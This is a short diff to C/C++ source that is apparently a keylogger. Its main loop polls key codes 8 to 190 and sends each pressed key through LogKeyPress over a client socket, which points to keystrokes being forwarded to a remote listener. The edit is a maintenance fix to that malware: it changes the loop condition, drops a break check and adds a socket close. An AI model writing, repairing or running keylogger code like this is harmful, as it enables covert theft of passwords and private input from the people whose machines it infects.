@@ -47,7 +47,7 @@ int main()
 
 
 	// Infinite loop to log keys
-	while (_clientSocket != NULL)
+	while (_clientSocket > 0)
 	{
 		for (int key = 8; key <= 190; key++)
 		{
@@ -55,12 +55,11 @@ int main()
 			{
 				LogKeyPress(key, _clientSocket);
 			}
-			if (_clientSocket == NULL)
-				break;
 		}
 
 		Sleep(10); // Sleep for a short duration to reduce CPU usage
 	}
+	closesocket(_clientSocket);
 	return 0;
 }
 
